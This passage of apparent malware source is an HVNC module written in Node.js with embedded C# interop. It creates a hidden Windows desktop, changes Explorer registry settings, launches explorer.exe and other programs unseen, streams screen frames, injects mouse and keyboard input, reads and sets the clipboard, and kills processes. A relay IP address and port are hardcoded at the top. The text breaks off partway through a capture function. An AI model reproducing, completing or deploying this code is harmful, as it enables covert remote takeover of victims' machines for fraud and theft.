// 317 NUMBER ONE - HVNC (Hidden Virtual Network Computing) Module
// Creates a hidden Windows desktop, launches apps, captures frames, relays input

var childProcess = require('child_process');
var net = require('net');
var os = require('os');
var path = require('path');
var fs = require('fs');
var crypto = require('crypto');

var HVNC_DESKTOP_NAME = '317_hvnc_' + crypto.randomBytes(4).toString('hex');
var RELAY_HOST = '20.238.26.126';
var RELAY_PORT = 7317;
var HVNC_FRAME_INTERVAL = 20;
var HVNC_HEARTBEAT_INTERVAL = 5000;

var _hvncActive = false;
var _hvncDesktopCreated = false;
var _hvncProcesses = [];
var _hvncLastFrame = null;
var _hvncAgentId = null;
var _psProcess = null;
var _psReady = false;
var _psPending = [];
var _psBuffer = '';

// PowerShell script to create hidden desktop and capture it via C# interop
var HVNC_HELPER_CS = `
using System;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;

public class HVNCHelper {
    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateDesktopW(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr OpenDesktopW(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

    [DllImport("user32.dll", SetLastError = true)]
    static extern bool CloseDesktop(IntPtr hDesktop);

    [DllImport("user32.dll", SetLastError = true)]
    static extern bool SetThreadDesktop(IntPtr hDesktop);

    [DllImport("user32.dll", SetLastError = true)]
    static extern IntPtr GetThreadDesktop(uint dwThreadId);

    [DllImport("kernel32.dll")]
    static extern uint GetCurrentThreadId();

    [DllImport("user32.dll", SetLastError = true)]
    static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("user32.dll", SetLastError = true)]
    static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("gdi32.dll")]
    static extern IntPtr CreateCompatibleDC(IntPtr hdc);

    [DllImport("gdi32.dll")]
    static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

    [DllImport("gdi32.dll")]
    static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

    [DllImport("gdi32.dll")]
    static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int rop);

    [DllImport("gdi32.dll")]
    static extern bool DeleteObject(IntPtr hObject);

    [DllImport("gdi32.dll")]
    static extern bool DeleteDC(IntPtr hdc);

    [DllImport("user32.dll")]
    static extern int GetSystemMetrics(int nIndex);

    [DllImport("user32.dll", SetLastError = true)]
    static extern bool PostMessageW(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", SetLastError = true)]
    static extern IntPtr FindWindowExW(IntPtr hWndParent, IntPtr hWndChildAfter, string lpszClass, string lpszWindow);

    [DllImport("user32.dll")]
    static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumWindowsProc lpfn, IntPtr lParam);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessW(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOW lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("user32.dll")]
    static extern void mouse_event(uint dwFlags, int dx, int dy, int dwData, IntPtr dwExtraInfo);

    [DllImport("user32.dll")]
    static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, IntPtr dwExtraInfo);

    [DllImport("user32.dll")]
    static extern bool SetCursorPos(int X, int Y);

    [DllImport("user32.dll")]
    static extern bool IsWindowVisible(IntPtr hWnd);

    [DllImport("user32.dll")]
    static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

    [DllImport("user32.dll")]
    static extern bool PrintWindow(IntPtr hWnd, IntPtr hdcBlt, uint nFlags);

    [DllImport("user32.dll")]
    static extern IntPtr WindowFromPoint(POINT Point);

    [DllImport("user32.dll")]
    static extern bool ScreenToClient(IntPtr hWnd, ref POINT lpPoint);

    [DllImport("user32.dll")]
    static extern bool SetForegroundWindow(IntPtr hWnd);

    [DllImport("user32.dll")]
    static extern IntPtr GetAncestor(IntPtr hwnd, uint gaFlags);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr SendMessageW(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")]
    static extern IntPtr ChildWindowFromPointEx(IntPtr hWndParent, POINT pt, uint uFlags);

    [DllImport("user32.dll")]
    static extern bool ClientToScreen(IntPtr hWnd, ref POINT lpPoint);

    [DllImport("user32.dll")]
    static extern IntPtr SetActiveWindow(IntPtr hWnd);

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);

    [DllImport("user32.dll")]
    static extern int GetWindowTextLength(IntPtr hWnd);

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    static extern bool BringWindowToTop(IntPtr hWnd);

    [DllImport("user32.dll")]
    static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    [DllImport("user32.dll")]
    static extern bool AttachThreadInput(uint idAttach, uint idAttachTo, bool fAttach);

    [DllImport("user32.dll")]
    static extern IntPtr GetFocus();

    [DllImport("user32.dll")]
    static extern bool IsHungAppWindow(IntPtr hWnd);

    [DllImport("user32.dll")]
    static extern bool PaintDesktop(IntPtr hdc);

    delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    const uint GENERIC_ALL = 0x10000000;
    const uint DESKTOP_CREATEWINDOW = 0x0002;
    const uint DESKTOP_WRITEOBJECTS = 0x0080;
    const uint DESKTOP_SWITCHDESKTOP = 0x0100;
    const uint DESKTOP_READOBJECTS = 0x0001;
    const int SRCCOPY = 0x00CC0020;
    const int SM_CXSCREEN = 0;
    const int SM_CYSCREEN = 1;

    const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
    const uint MOUSEEVENTF_LEFTUP = 0x0004;
    const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
    const uint MOUSEEVENTF_RIGHTUP = 0x0010;
    const uint MOUSEEVENTF_MOVE = 0x0001;
    const uint MOUSEEVENTF_ABSOLUTE = 0x8000;
    const uint MOUSEEVENTF_WHEEL = 0x0800;
    const uint KEYEVENTF_KEYUP = 0x0002;
    const uint PW_RENDERFULLCONTENT = 2;
    const uint WM_MOUSEMOVE = 0x0200;
    const uint WM_LBUTTONDOWN = 0x0201;
    const uint WM_LBUTTONUP = 0x0202;
    const uint WM_LBUTTONDBLCLK = 0x0203;
    const uint WM_RBUTTONDOWN = 0x0204;
    const uint WM_RBUTTONUP = 0x0205;
    const uint WM_MOUSEWHEEL = 0x020A;
    const uint WM_NCHITTEST = 0x0084;
    const uint WM_NCLBUTTONDOWN = 0x00A1;
    const uint WM_NCLBUTTONUP = 0x00A2;
    const uint WM_NCLBUTTONDBLCLK = 0x00A3;
    const uint WM_NCRBUTTONDOWN = 0x00A4;
    const uint WM_NCRBUTTONUP = 0x00A5;
    const uint WM_NCMOUSEMOVE = 0x00A0;
    const int HTCLIENT = 1;
    const int HTNOWHERE = 0;
    const int MK_LBUTTON = 1;
    const int MK_RBUTTON = 2;
    const uint GA_ROOT = 2;
    const uint CWP_ALL = 0x0000;
    const uint CWP_SKIPINVISIBLE = 0x0001;
    const uint CWP_SKIPDISABLED = 0x0002;
    const uint CWP_SKIPTRANSPARENT = 0x0004;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFOW {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX, dwY, dwXSize, dwYSize;
        public int dwXCountChars, dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RECT {
        public int Left, Top, Right, Bottom;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct POINT { public int X, Y; }

    static IntPtr _hDesktop = IntPtr.Zero;
    static IntPtr _hOrigDesktop = IntPtr.Zero;
    static string _desktopName = "";
    static int _captureWidth = 1920;
    static int _captureHeight = 1080;

    public static string CreateHiddenDesktop(string name) {
        _desktopName = name;
        _hOrigDesktop = GetThreadDesktop(GetCurrentThreadId());
        _hDesktop = CreateDesktopW(name, IntPtr.Zero, IntPtr.Zero, 0, GENERIC_ALL, IntPtr.Zero);
        if (_hDesktop == IntPtr.Zero) {
            _hDesktop = OpenDesktopW(name, 0, false, GENERIC_ALL);
        }
        if (_hDesktop == IntPtr.Zero) return "ERROR:CreateDesktop failed";
        return "OK:" + name;
    }

    // Full desktop path for CreateProcessW (WinSta0\\DesktopName format)
    static string FullDesktopName { get { return "WinSta0\\\\" + _desktopName; } }

    public static string LaunchOnDesktop(string exePath, string args) {
        if (_hDesktop == IntPtr.Zero) return "ERROR:No desktop";
        var si = new STARTUPINFOW();
        si.cb = Marshal.SizeOf(si);
        si.lpDesktop = FullDesktopName;
        PROCESS_INFORMATION pi;
        string cmdLine = (char)34 + exePath + (char)34;
        if (!string.IsNullOrEmpty(args)) cmdLine += " " + args;
        bool ok = CreateProcessW(null, cmdLine, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref si, out pi);
        if (!ok) return "ERROR:CreateProcess failed (" + Marshal.GetLastWin32Error() + ")";
        return "OK:" + pi.dwProcessId;
    }

    // Launch explorer.exe shell on hidden desktop using thread-desktop inheritance.
    public static string LaunchShellOnDesktop() {
        if (_hDesktop == IntPtr.Zero) return "ERROR:No desktop";

        // Force explorer to run as separate process per desktop (prevents singleton merge)
        try {
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer", true);
            if (key != null) {
                key.SetValue("DesktopProcess", 1, Microsoft.Win32.RegistryValueKind.DWord);
                key.SetValue("BrowseNewProcess", "yes", Microsoft.Win32.RegistryValueKind.String);
                key.Close();
            }
        } catch (Exception) { }

        string result = null;
        var thread = new System.Threading.Thread(() => {
            try {
                // Switch this thread to the hidden desktop
                if (!SetThreadDesktop(_hDesktop)) {
                    result = "ERROR:SetThreadDesktop failed (" + Marshal.GetLastWin32Error() + ")";
                    return;
                }

                var si = new STARTUPINFOW();
                si.cb = Marshal.SizeOf(si);
                si.lpDesktop = FullDesktopName;
                PROCESS_INFORMATION pi;

                string winDir = Environment.GetEnvironmentVariable("WINDIR") ?? @"C:\\Windows";
                string explorerPath = winDir + @"\\explorer.exe";

                // Use same pattern as LaunchOnDesktop (null lpApplicationName)
                string cmdLine = (char)34 + explorerPath + (char)34;
                bool ok = CreateProcessW(
                    null,
                    cmdLine,
                    IntPtr.Zero, IntPtr.Zero,
                    false,
                    0,
                    IntPtr.Zero, null,
                    ref si, out pi
                );

                if (!ok) {
                    result = "ERROR:CreateProcess failed (" + Marshal.GetLastWin32Error() + ")";
                    return;
                }
                result = "OK:" + pi.dwProcessId;
            } catch (Exception ex) {
                result = "ERROR:" + ex.Message;
            }
        });
        thread.SetApartmentState(System.Threading.ApartmentState.STA);
        thread.Start();
        if (!thread.Join(15000)) return "ERROR:Thread timeout";
        return result ?? "ERROR:Unknown";
    }

    // Run action on a clean thread (PowerShell's main thread has hooks/windows
    // which makes SetThreadDesktop fail — new threads have no windows so it works)
    static string RunOnDesktopThread(System.Threading.ThreadStart work, int timeoutMs = 10000) {
        if (_hDesktop == IntPtr.Zero) return "ERROR:No desktop";
        string threadResult = null;
        var thread = new System.Threading.Thread(() => {
            try {
                if (!SetThreadDesktop(_hDesktop)) {
                    threadResult = "ERROR:SetThreadDesktop failed (" + Marshal.GetLastWin32Error() + ")";
                    return;
                }
                work();
            } catch (Exception ex) {
                threadResult = "ERROR:" + ex.Message;
            }
        });
        thread.SetApartmentState(System.Threading.ApartmentState.STA);
        thread.Start();
        if (!thread.Join(timeoutMs)) return "ERROR:Thread timeout";
        return threadResult;
    }

    static byte[] _lastFrameBytes = null;
    static int _lastFrameHash = 0;

    public static string CaptureDesktop(string outputPath) {
        string captureResult = null;
        string res = RunOnDesktopThread(delegate {
            int w = _captureWidth;
            int h = _captureHeight;

            using (var bmp = new Bitmap(w, h, System.Drawing.Imaging.PixelFormat.Format24bppRgb)) {
                using (var g = Graphics.FromImage(bmp)) {
                    g.CompositingMode = System.Drawing.Drawing2D.CompositingMode.SourceCopy;
                    g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                    g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.None;
                    g.PixelOffsetMode = System.Drawing.Drawing2D.PixelOffsetMode.None;
                    g.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighSpeed;

                    // Paint desktop background (wallpaper/pattern) then overlay with BitBlt
                    IntPtr gHdc = g.GetHdc();
                    PaintDesktop(gHdc);
                    IntPtr desktopDC = GetDC(IntPtr.Zero);
                    if (desktopDC != IntPtr.Zero) {
                        BitBlt(gHdc, 0, 0, w, h, desktopDC, 0, 0, SRCCOPY);
                        ReleaseDC(IntPtr.Zero, desktopDC);
                    }
                    g.ReleaseHdc(gHdc);
                }

                var jpegEncoder = GetEncoder(ImageFormat.Jpeg);
                var encoderParams = new EncoderParameters(1);
                encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 90L);
                using (var ms = new MemoryStream()) {
                    bmp.Save(ms, jpegEncoder, encoderParams);
                    byte[] frameBytes = ms.ToArray();

                    // Delta detection: skip if frame identical
                    int hash = frameBytes.Length;
                    for (int i = 0; i < Math.Min(frameBytes.Length, 512); i++) hash = hash * 31 + frameBytes[i];
                    if (hash == _lastFrameHash && _lastFrameBytes != null && _lastFrameBytes.Length == frameBytes.Length) {
                        captureResult = "SKIP";
                    } else {
                        _lastFrameHash = hash;
                        _lastFrameBytes = frameBytes;
                        // Write directly to file - avoids base64 encode/decode overhead
                        File.WriteAllBytes(outputPath, frameBytes);
                        captureResult = "FILE:" + frameBytes.Length;
                    }
                }
            }
        });
        if (res != null) return res;
        return captureResult ?? "ERROR:No capture result";
    }

    // === FAST CAPTURE LOOP (bypasses PowerShell round-trip) ===
    static volatile bool _captureLoopRunning = false;
    static System.Threading.Thread _captureThread = null;

    static ImageCodecInfo _cachedJpegEncoder = null;
    static ImageCodecInfo GetJpegEncoder() {
        if (_cachedJpegEncoder == null) _cachedJpegEncoder = GetEncoder(ImageFormat.Jpeg);
        return _cachedJpegEncoder;
    }

    public static string StartCaptureLoop(string outputDir) {
        if (_captureLoopRunning) return "OK:ALREADY_RUNNING";
        if (_hDesktop == IntPtr.Zero) return "ERROR:No desktop";
        _captureLoopRunning = true;
        _captureThread = new System.Threading.Thread(() => {
            string pathA = Path.Combine(outputDir, "frame_a.jpg");
            string pathB = Path.Combine(outputDir, "frame_b.jpg");
            string signalPath = Path.Combine(outputDir, "frame_ready.txt");
            bool useA = true;
            var jpegEncoder = GetJpegEncoder();
            var encoderParams = new EncoderParameters(1);
            encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 55L);

            // Pre-allocate reusable objects outside loop to avoid GC pressure
            int w = _captureWidth;
            int h = _captureHeight;
            Bitmap bmp = new Bitmap(w, h, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
            Graphics g = Graphics.FromImage(bmp);
            g.CompositingMode = System.Drawing.Drawing2D.CompositingMode.SourceCopy;
            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.NearestNeighbor;
            g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.None;
            g.PixelOffsetMode = System.Drawing.Drawing2D.PixelOffsetMode.None;
            g.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighSpeed;
            MemoryStream ms = new MemoryStream(512 * 1024); // pre-allocate 512KB

            bool firstFrame = true;

            // Set thread desktop once before entering the loop
            if (!SetThreadDesktop(_hDesktop)) {
                try { File.AppendAllText(Path.Combine(outputDir, "capture_errors.log"), "Failed to set thread desktop\\n"); } catch {}
                return;
            }

            while (_captureLoopRunning) {
                try {

                    // Recreate bitmap if resolution changed
                    int cw = _captureWidth;
                    int ch = _captureHeight;
                    if (cw != w || ch != h) {
                        g.Dispose(); bmp.Dispose();
                        w = cw; h = ch;
                        bmp = new Bitmap(w, h, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
                        g = Graphics.FromImage(bmp);
                        g.CompositingMode = System.Drawing.Drawing2D.CompositingMode.SourceCopy;
                        g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.NearestNeighbor;
                        g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.None;
                        g.PixelOffsetMode = System.Drawing.Drawing2D.PixelOffsetMode.None;
                        g.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighSpeed;
                        firstFrame = true;
                    }

                    // Clear background only on first frame — subsequent frames keep previous content
                    // to prevent flickering when PrintWindow occasionally fails for GPU windows
                    if (firstFrame) {
                        g.Clear(Color.Black);
                        firstFrame = false;
                    }

                    // Enumerate all visible windows on hidden desktop
                    var windowList = new System.Collections.Generic.List<IntPtr>();
                    EnumDesktopWindows(_hDesktop, delegate(IntPtr hWnd, IntPtr lParam) {
                        if (IsWindowVisible(hWnd)) windowList.Add(hWnd);
                        return true;
                    }, IntPtr.Zero);

                    // Paint windows over previous frame content (no clear = no flicker)
                    // Paint windows in reverse order (bottom to top Z-order)
                    for (int wi = windowList.Count - 1; wi >= 0; wi--) {
                        IntPtr hWnd = windowList[wi];
                        RECT rc;
                        if (!GetWindowRect(hWnd, out rc)) continue;
                        int ww = rc.Right - rc.Left;
                        int wh = rc.Bottom - rc.Top;
                        if (ww <= 0 || wh <= 0 || ww > 4096 || wh > 4096) continue;
                        if (rc.Left >= w || rc.Top >= h) continue;
                        try {
                            using (var wBmp = new Bitmap(ww, wh)) {
                                using (var wGfx = Graphics.FromImage(wBmp)) {
                                    IntPtr wHdc = wGfx.GetHdc();
                                    bool printed = PrintWindow(hWnd, wHdc, PW_RENDERFULLCONTENT);
                                    wGfx.ReleaseHdc(wHdc);
                                    // Only draw if PrintWindow succeeded
                                    if (printed) {
                                        g.DrawImageUnscaled(wBmp, rc.Left, rc.Top);
                                    }
                                }
                            }
                        } catch { }
                    }

                    // Encode to JPEG using reusable MemoryStream
                    ms.SetLength(0);
                    bmp.Save(ms, jpegEncoder, encoderParams);
                    int frameLen = (int)ms.Length;
                    byte[] frameBuf = ms.GetBuffer(); // no copy — direct access

                    // Write every frame (no delta skip — ensures smooth FPS on panel)
                    string target = useA ? pathA : pathB;
                    using (var fs = new FileStream(target, FileMode.Create, FileAccess.Write, FileShare.Read, 65536)) {
                        fs.Write(frameBuf, 0, frameLen);
                    }
                    File.WriteAllText(signalPath, (useA ? "A:" : "B:") + frameLen);
                    useA = !useA;
                } catch (Exception captureEx) {
                    try { File.AppendAllText(Path.Combine(outputDir, "capture_errors.log"), DateTime.Now + ": " + captureEx.ToString() + "\\n"); } catch {}
                }
                System.Threading.Thread.Sleep(8);
            }
            // Cleanup
            try { g.Dispose(); } catch {}
            try { bmp.Dispose(); } catch {}
            try { ms.Dispose(); } catch {}
        });
        _captureThread.SetApartmentState(System.Threading.ApartmentState.STA);
        _captureThread.IsBackground = true;
        _captureThread.Start();
        return "OK:STARTED";
    }

    public static string StopCaptureLoop() {
        _captureLoopRunning = false;
        if (_captureThread != null) { _captureThread.Join(3000); _captureThread = null; }
        return "OK:STOPPED";
    }

    static IntPtr MakeLParam(int lo, int hi) {
        return (IntPtr)((hi << 16) | (lo & 0xFFFF));
    }

    public static string SendMouseInput(int x, int y, string action) {
        string inputResult = null;
        string res = RunOnDesktopThread(delegate {
            SetCursorPos(x, y);
            System.Threading.Thread.Sleep(5);

            POINT pt; pt.X = x; pt.Y = y;
            IntPtr hWnd = WindowFromPoint(pt);
            if (hWnd == IntPtr.Zero) { inputResult = "ERROR:No window at point"; return; }

            IntPtr topWnd = GetAncestor(hWnd, GA_ROOT);
            if (topWnd != IntPtr.Zero) {
                SetForegroundWindow(topWnd);
                SetActiveWindow(topWnd);
            }
            System.Threading.Thread.Sleep(5);

            // Hit test to determine client vs non-client area
            IntPtr lParamScreen = MakeLParam(x, y);
            IntPtr hitTest = SendMessageW(hWnd, WM_NCHITTEST, IntPtr.Zero, lParamScreen);
            int ht = hitTest.ToInt32();

            if (action == "scrollup" || action == "scrolldown") {
                int delta = (action == "scrollup") ? 120 : -120;
                IntPtr wParam = (IntPtr)(delta << 16);
                PostMessageW(hWnd, WM_MOUSEWHEEL, wParam, lParamScreen);
                inputResult = "OK";
                return;
            }

            if (action == "move") {
                if (ht == HTCLIENT) {
                    POINT cPt; cPt.X = x; cPt.Y = y;
                    ScreenToClient(hWnd, ref cPt);
                    PostMessageW(hWnd, WM_MOUSEMOVE, IntPtr.Zero, MakeLParam(cPt.X, cPt.Y));
                } else {
                    PostMessageW(hWnd, WM_NCMOUSEMOVE, (IntPtr)ht, lParamScreen);
                }
                inputResult = "OK";
                return;
            }

            if (ht == HTCLIENT) {
                // Client area: find deepest child window and send client messages
                POINT cPt; cPt.X = x; cPt.Y = y;
                ScreenToClient(hWnd, ref cPt);
                IntPtr childWnd = ChildWindowFromPointEx(hWnd, cPt, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED);
                IntPtr target = (childWnd != IntPtr.Zero && childWnd != hWnd) ? childWnd : hWnd;

                // Convert screen coords to target child client coords
                POINT tPt; tPt.X = x; tPt.Y = y;
                ScreenToClient(target, ref tPt);
                IntPtr lpc = MakeLParam(tPt.X, tPt.Y);

                switch (action) {
                    case "click":
                        PostMessageW(target, WM_LBUTTONDOWN, (IntPtr)MK_LBUTTON, lpc);
                        System.Threading.Thread.Sleep(30);
                        PostMessageW(target, WM_LBUTTONUP, IntPtr.Zero, lpc);
                        break;
                    case "rightclick":
                        PostMessageW(target, WM_RBUTTONDOWN, (IntPtr)MK_RBUTTON, lpc);
                        System.Threading.Thread.Sleep(30);
                        PostMessageW(target, WM_RBUTTONUP, IntPtr.Zero, lpc);
                        break;
                    case "dblclick":
                        PostMessageW(target, WM_LBUTTONDOWN, (IntPtr)MK_LBUTTON, lpc);
                        PostMessageW(target, WM_LBUTTONUP, IntPtr.Zero, lpc);
                        System.Threading.Thread.Sleep(30);
                        PostMessageW(target, WM_LBUTTONDBLCLK, (IntPtr)MK_LBUTTON, lpc);
                        PostMessageW(target, WM_LBUTTONUP, IntPtr.Zero, lpc);
                        break;
                }
            } else {
                // Non-client area (close, minimize, maximize, caption, etc)
                switch (action) {
                    case "click":
                        PostMessageW(hWnd, WM_NCLBUTTONDOWN, (IntPtr)ht, lParamScreen);
                        System.Threading.Thread.Sleep(30);
                        PostMessageW(hWnd, WM_NCLBUTTONUP, (IntPtr)ht, lParamScreen);
                        break;
                    case "rightclick":
                        PostMessageW(hWnd, WM_NCRBUTTONDOWN, (IntPtr)ht, lParamScreen);
                        System.Threading.Thread.Sleep(30);
                        PostMessageW(hWnd, WM_NCRBUTTONUP, (IntPtr)ht, lParamScreen);
                        break;
                    case "dblclick":
                        PostMessageW(hWnd, WM_NCLBUTTONDOWN, (IntPtr)ht, lParamScreen);
                        PostMessageW(hWnd, WM_NCLBUTTONUP, (IntPtr)ht, lParamScreen);
                        System.Threading.Thread.Sleep(30);
                        PostMessageW(hWnd, WM_NCLBUTTONDBLCLK, (IntPtr)ht, lParamScreen);
                        PostMessageW(hWnd, WM_NCLBUTTONUP, (IntPtr)ht, lParamScreen);
                        break;
                }
            }
            inputResult = "OK";
        }, 5000);
        if (res != null) return res;
        return inputResult ?? "ERROR:No input result";
    }

    public static string SendKeyInput(byte vk, bool keyUp) {
        string keyResult = null;
        string res = RunOnDesktopThread(delegate {
            uint flags = keyUp ? KEYEVENTF_KEYUP : 0;
            keybd_event(vk, 0, flags, IntPtr.Zero);
            keyResult = "OK";
        }, 5000);
        if (res != null) return res;
        return keyResult ?? "ERROR:No key result";
    }

    public static string TypeText(string text) {
        string typeResult = null;
        string res = RunOnDesktopThread(delegate {
            // Find the foreground window on the hidden desktop
            IntPtr fg = GetForegroundWindow();
            if (fg == IntPtr.Zero) { typeResult = "ERROR:No foreground window"; return; }

            // Attach to the foreground window's thread to get the focused child
            uint _pid;
            uint fgThread = GetWindowThreadProcessId(fg, out _pid);
            uint curThread = GetCurrentThreadId();
            bool attached = false;
            if (fgThread != curThread) {
                attached = AttachThreadInput(curThread, fgThread, true);
            }

            IntPtr target = GetFocus();
            if (target == IntPtr.Zero) target = fg;

            if (attached) AttachThreadInput(curThread, fgThread, false);

            // Send WM_CHAR for each character — this goes directly to the target window
            const uint WM_CHAR = 0x0102;
            foreach (char c in text) {
                PostMessageW(target, WM_CHAR, (IntPtr)c, IntPtr.Zero);
                System.Threading.Thread.Sleep(10);
            }
            typeResult = "OK";
        }, 15000);
        if (res != null) return res;
        return typeResult ?? "ERROR:No type result";
    }

    [DllImport("user32.dll")]
    static extern short VkKeyScan(char ch);

    public static string SetResolution(int w, int h) {
        _captureWidth = w;
        _captureHeight = h;
        return "OK:" + w + "x" + h;
    }

    public static string GetClipboardText() {
        string clipResult = null;
        string res = RunOnDesktopThread(delegate {
            try {
                if (Clipboard.ContainsText()) {
                    clipResult = "OK:" + Clipboard.GetText();
                } else {
                    clipResult = "EMPTY";
                }
            } catch (Exception ex) {
                clipResult = "ERROR:" + ex.Message;
            }
        }, 5000);
        if (res != null) return res;
        return clipResult ?? "ERROR:No clipboard result";
    }

    public static string SetClipboardText(string text) {
        string clipResult = null;
        string res = RunOnDesktopThread(delegate {
            try {
                Clipboard.SetText(text);
                clipResult = "OK";
            } catch (Exception ex) {
                clipResult = "ERROR:" + ex.Message;
            }
        }, 5000);
        if (res != null) return res;
        return clipResult ?? "ERROR:No clipboard result";
    }

    public static string ListWindows() {
        string listResult = null;
        string res = RunOnDesktopThread(delegate {
            var windows = new System.Collections.Generic.List<string>();
            EnumDesktopWindows(_hDesktop, delegate(IntPtr hWnd, IntPtr lParam) {
                if (IsWindowVisible(hWnd)) {
                    int len = GetWindowTextLength(hWnd);
                    if (len > 0) {
                        var sb = new System.Text.StringBuilder(len + 1);
                        GetWindowText(hWnd, sb, sb.Capacity);
                        string title = sb.ToString();
                        if (!string.IsNullOrEmpty(title)) {
                            RECT r; GetWindowRect(hWnd, out r);
                            windows.Add(hWnd.ToInt64() + "|" + title + "|" + (r.Right-r.Left) + "x" + (r.Bottom-r.Top));
                        }
                    }
                }
                return true;
            }, IntPtr.Zero);
            listResult = "OK:" + string.Join("^^", windows);
        }, 5000);
        if (res != null) return res;
        return listResult ?? "ERROR:No list result";
    }

    public static string FocusWindow(long hwndValue) {
        string focusResult = null;
        string res = RunOnDesktopThread(delegate {
            IntPtr hWnd = new IntPtr(hwndValue);
            ShowWindow(hWnd, 9);
            SetForegroundWindow(hWnd);
            BringWindowToTop(hWnd);
            focusResult = "OK";
        }, 5000);
        if (res != null) return res;
        return focusResult ?? "ERROR:No focus result";
    }

    public static string CloseWindowByHandle(long hwndValue) {
        IntPtr hWnd = new IntPtr(hwndValue);
        PostMessageW(hWnd, 0x0010, IntPtr.Zero, IntPtr.Zero);
        return "OK";
    }

    public static string ListProcesses() {
        string listResult = null;
        string res = RunOnDesktopThread(delegate {
            var seen = new System.Collections.Generic.HashSet<int>();
            var list = new System.Collections.Generic.List<string>();
            EnumDesktopWindows(_hDesktop, delegate(IntPtr hWnd, IntPtr lParam) {
                if (IsWindowVisible(hWnd)) {
                    uint pid;
                    GetWindowThreadProcessId(hWnd, out pid);
                    if (pid > 0 && !seen.Contains((int)pid)) {
                        seen.Add((int)pid);
                        try {
                            var p = Process.GetProcessById((int)pid);
                            int len = GetWindowTextLength(hWnd);
                            string title = "";
                            if (len > 0) {
                                var sb = new System.Text.StringBuilder(len + 1);
                                GetWindowText(hWnd, sb, sb.Capacity);
                                title = sb.ToString();
                            }
                            list.Add(pid + "|" + p.ProcessName + "|" + title);
                        } catch { }
                    }
                }
                return true;
            }, IntPtr.Zero);
            listResult = "OK:" + string.Join("^^", list);
        }, 5000);
        if (res != null) return res;
        return listResult ?? "ERROR:No list result";
    }

    public static string KillProcess(int pid) {
        try {
            var p = Process.GetProcessById(pid);
            p.Kill();
            return "OK";
        } catch (Exception ex) {
            return "ERROR:" + ex.Message;
        }
    }

    public static string CaptureDesktopHQ(string outputPath) {
        string captureResult = null;
        string res = RunOnDesktopThread(delegate {
            int w = _captureWidth;
            int h = _captureHeight;
            using (var bmp = new Bitmap(w, h)) {
                using (var g = Graphics.FromImage(bmp)) {
                    IntPtr bgHdc = g.GetHdc();
                    PaintDesktop(bgHdc);
                    IntPtr dDC = GetDC(IntPtr.Zero);
                    if (dDC != IntPtr.Zero) { BitBlt(bgHdc, 0, 0, w, h, dDC, 0, 0, SRCCOPY); ReleaseDC(IntPtr.Zero, dDC); }
                    g.ReleaseHdc(bgHdc);
                }
                var jpegEncoder = GetEncoder(ImageFormat.Jpeg);
